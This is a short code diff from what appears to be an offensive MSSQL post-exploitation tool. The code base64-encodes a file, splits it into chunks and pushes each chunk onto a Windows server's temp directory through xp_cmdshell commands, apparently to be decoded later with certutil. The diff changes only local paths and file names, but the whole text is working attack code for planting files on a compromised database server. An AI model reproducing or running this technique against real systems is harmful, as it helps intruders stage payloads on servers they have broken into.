@@ -27,9 +27,9 @@ class mssql_certutil:
                 utf8_text = bs.decode('utf-8')
                 text = self.cut_text(utf8_text, 65)
                 for i in text:
-                    with open(r"C:\Users\cloud\Desktop\python\base64_win\base64\base64.txt",'w') as txt:
-                        txt.write(i)
-                    payload =r"""exec master..xp_cmdshell '>>c:\windows\temp\vars.txt set /p="{}" <nul';""".format(i)
+                    with open(r"./base64/base64.txt",'a+') as txt:
+                        txt.write(i+"\n")
+                    payload =r"""exec master..xp_cmdshell '>>c:\windows\temp\test.txt set /p="{}" <nul';""".format(i)
                     print(payload)
                     config.mssql_exec(coon=self.coon,payload=payload).sql_exec()
             xuanze = input("[+]写入完成，是否开始使用xp_cmdshell对该文件进行操作(Y/N):")
